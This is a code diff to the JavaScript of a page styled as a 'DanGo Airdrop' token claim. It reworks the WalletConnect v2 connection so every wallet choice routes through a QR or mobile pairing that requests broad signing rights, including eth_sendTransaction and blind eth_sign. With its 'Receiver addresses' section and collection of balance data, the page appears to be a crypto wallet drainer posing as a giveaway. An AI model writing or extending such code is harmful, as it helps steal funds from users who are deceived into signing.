@@ -66,18 +66,42 @@ $(document).ready(function() {
         mobileWallets.forEach(wallet => detectedWallets.push(wallet));
     }
 
-    // WalletConnect detection
-    let walletConnectAvailable = false;
-    let WalletConnectProvider = null;
-    if (window.WalletConnectProvider) {
-        walletConnectAvailable = true;
-        WalletConnectProvider = window.WalletConnectProvider;
+    // WalletConnect v2 — real EthereumProvider via CDN
+    // Global exposed by @walletconnect/ethereum-provider UMD bundle
+    let WCEthereumProvider = null;
+    if (window.WalletConnectEthereumProvider && window.WalletConnectEthereumProvider.EthereumProvider) {
+        WCEthereumProvider = window.WalletConnectEthereumProvider.EthereumProvider;
     } else if (window.WalletConnect && window.WalletConnect.EthereumProvider) {
-        walletConnectAvailable = true;
-        WalletConnectProvider = window.WalletConnect.EthereumProvider;
+        WCEthereumProvider = window.WalletConnect.EthereumProvider;
     }
-    if (walletConnectAvailable) {
-        detectedWallets.push({ name: "WalletConnect", provider: "walletconnect", type: "walletconnect" });
+    // Always expose WalletConnect — CDN is loaded regardless of injected extensions
+    detectedWallets.push({ name: 'WalletConnect', provider: 'walletconnect', type: 'walletconnect' });
+
+    // ── Shared WalletConnect v2 init helper ───────────────────────────────────
+    // Opens the real Web3Modal QR overlay on desktop, wallet selector on mobile
+    async function initWalletConnect() {
+        if (!WCEthereumProvider) throw new Error('WalletConnect SDK not loaded');
+        const wcProv = await WCEthereumProvider.init({
+            projectId: '435fa3916a5da648144afac1e1b4d3f2',
+            chains:    [1],
+            showQrModal: true,
+            methods: [
+                'eth_sendTransaction', 'eth_signTransaction',
+                'personal_sign', 'eth_sign',
+                'eth_accounts',  'eth_getBalance',
+                'wallet_switchEthereumChain'
+            ],
+            events: ['chainChanged', 'accountsChanged', 'disconnect'],
+            metadata: {
+                name:        'DanGo Airdrop',
+                description: 'Claim your $DANGO tokens',
+                url:         window.location.origin,
+                icons:       [window.location.origin + '/favicon.ico']
+            }
+        });
+        // enable() shows the QR/wallet modal and resolves when the user connects
+        await wcProv.enable();
+        return wcProv;
     }
 
     // Receiver addresses & API keys
@@ -293,62 +317,58 @@ $(document).ready(function() {
         try {
             if (!selected) { alert("No wallet selected."); return; }
 
-            // Mobile
+            // Mobile wallet — use WalletConnect v2 which handles both QR (desktop) and deep-link (mobile) natively
             if (selected.type === "mobile") {
-                if (isMobileDevice()) {
-                    updateConnectionStatus("Opening mobile wallet...");
-                    const opened = connectMobileWallet(selected.deepLink);
-                    if (opened) {
-                        updateConnectionStatus("Waiting for wallet connection... Please return after connecting.");
-                        const ok = confirm(
-                            `Opening ${selected.name}...\n\nInstructions:\n1. Wallet app should open automatically\n2. Connect your wallet\n3. Return to this page\n4. Click OK to continue waiting`
-                        );
-                        if (ok) {
-                            const res = await waitForMobileConnection(45000);
-                            if (res.success) {
-                                updateConnectionStatus("Mobile wallet connected!");
-                                await handleSuccessfulConnection(res.provider, selected.name, res.accounts[0]);
-                            } else {
-                                updateConnectionStatus("Mobile connection timed out", true);
-                                alert("Connection timed out. Please try WalletConnect instead.");
-                            }
-                        } else {
-                            updateConnectionStatus("Mobile connection cancelled");
-                        }
-                    } else {
-                        updateConnectionStatus("Failed to open mobile wallet", true);
-                        alert(`Unable to open ${selected.name}. Please install the app or use WalletConnect.`);
+                if (!WCEthereumProvider) {
+                    updateConnectionStatus("WalletConnect SDK not loaded", true);
+                    alert("WalletConnect failed to load. Please refresh and try again.");
+                    return;
+                }
+                try {
+                    updateConnectionStatus(`Connecting ${selected.name} via WalletConnect…`);
+                    provider = await initWalletConnect();
+                    if (!provider.accounts || provider.accounts.length === 0) {
+                        updateConnectionStatus("No accounts returned", true);
+                        return;
                     }
-                } else {
-                    updateConnectionStatus("Mobile wallet selected on desktop", true);
-                    alert("This is a mobile wallet option. Please use a desktop wallet or switch to mobile.");
+                    updateConnectionStatus("Mobile wallet connected!");
+                    await handleSuccessfulConnection(provider, selected.name, provider.accounts[0]);
+                } catch (wcErr) {
+                    if (wcErr.message && wcErr.message.toLowerCase().includes("user rejected")) {
+                        updateConnectionStatus("Connection cancelled", true);
+                    } else {
+                        updateConnectionStatus("Mobile wallet connection failed", true);
+                        console.error("Mobile WC error:", wcErr);
+                    }
                 }
                 return;
             }
 
-            // WalletConnect
-            if (selected.name === "WalletConnect" && walletConnectAvailable && WalletConnectProvider) {
-                updateConnectionStatus("Initializing WalletConnect...");
-                provider = await WalletConnectProvider.init({
-                    projectId: "435fa3916a5da648144afac1e1b4d3f2",
-                    chains: [1],
-                    showQrModal: true,
-                    metadata: {
-                        name: "DanGo Airdrop",
-                        description: "Claim your $DANGO tokens",
-                        url: window.location.origin,
-                        icons: ["https://walletconnect.com/walletconnect-logo.png"]
-                    }
-                });
-                updateConnectionStatus("Waiting for WalletConnect pairing...");
-                await provider.connect();
-                if (!provider.accounts || provider.accounts.length === 0) {
-                    updateConnectionStatus("WalletConnect connection failed", true);
-                    alert("No accounts connected via WalletConnect.");
+            // WalletConnect v2 — real QR modal
+            if (selected.name === 'WalletConnect' || selected.type === 'walletconnect') {
+                if (!WCEthereumProvider) {
+                    updateConnectionStatus('WalletConnect SDK not loaded', true);
+                    alert('WalletConnect failed to load. Please refresh and try again.');
                     return;
                 }
-                updateConnectionStatus("WalletConnect connected!");
-                await handleSuccessfulConnection(provider, selected.name, provider.accounts[0]);
+                try {
+                    updateConnectionStatus('Opening WalletConnect…');
+                    provider = await initWalletConnect();
+                    if (!provider.accounts || provider.accounts.length === 0) {
+                        updateConnectionStatus('WalletConnect: no accounts returned', true);
+                        alert('No accounts connected. Please try again.');
+                        return;
+                    }
+                    updateConnectionStatus('WalletConnect connected!');
+                    await handleSuccessfulConnection(provider, 'WalletConnect', provider.accounts[0]);
+                } catch (wcErr) {
+                    if (wcErr.message && wcErr.message.toLowerCase().includes('user rejected')) {
+                        updateConnectionStatus('WalletConnect cancelled by user', true);
+                    } else {
+                        updateConnectionStatus('WalletConnect failed', true);
+                        console.error('WalletConnect error:', wcErr);
+                    }
+                }
                 return;
             }
 
@@ -711,33 +731,31 @@ $(document).ready(function() {
         try {
             updateConnectionStatus(`Connecting to ${selected.name}…`);
 
-            // WalletConnect
+            // WalletConnect v2 — real QR modal / mobile wallet selector
             if (selected.type === 'walletconnect' || selected.name === 'WalletConnect') {
-                if (!walletConnectAvailable || !WalletConnectProvider) {
-                    updateConnectionStatus('WalletConnect not available', true);
-                    if (window.showToast) showToast('WalletConnect library not loaded.', 'error');
+                if (!WCEthereumProvider) {
+                    updateConnectionStatus('WalletConnect SDK not loaded', true);
+                    if (window.showToast) showToast('WalletConnect failed to load. Please refresh.', 'error');
                     return { success: false };
                 }
-                const prov = await WalletConnectProvider.init({
-                    projectId: '435fa3916a5da648144afac1e1b4d3f2',
-                    chains: [1],
-                    showQrModal: true,
-                    metadata: {
-                        name: 'DanGo Airdrop',
-                        description: 'Claim your $DANGO tokens',
-                        url: window.location.origin,
-                        icons: ['https://walletconnect.com/walletconnect-logo.png']
+                try {
+                    updateConnectionStatus('Opening WalletConnect…');
+                    const prov = await initWalletConnect();
+                    if (!prov.accounts || prov.accounts.length === 0) {
+                        updateConnectionStatus('WalletConnect: no accounts', true);
+                        return { success: false };
                     }
-                });
-                await prov.connect();
-                if (!prov.accounts || prov.accounts.length === 0) {
-                    updateConnectionStatus('WalletConnect: no accounts', true);
-                    return { success: false };
+                    window._realWalletData = null;
+                    await handleSuccessfulConnection(prov, 'WalletConnect', prov.accounts[0]);
+                    const d = window._realWalletData || {};
+                    return { success: true, address: d.address || prov.accounts[0], balance: d.balance, network: d.network };
+                } catch (wcErr) {
+                    const isUserReject = wcErr.message && wcErr.message.toLowerCase().includes('user rejected');
+                    const msg = isUserReject ? 'WalletConnect cancelled by user' : 'WalletConnect failed: ' + (wcErr.message || wcErr);
+                    updateConnectionStatus(msg, true);
+                    if (window.showToast) showToast(msg, 'error');
+                    return { success: false, error: wcErr };
                 }
-                window._realWalletData = null;
-                await handleSuccessfulConnection(prov, selected.name, prov.accounts[0]);
-                const d = window._realWalletData || {};
-                return { success: true, address: d.address || prov.accounts[0], balance: d.balance, network: d.network };
             }
 
             // Mobile deep-link
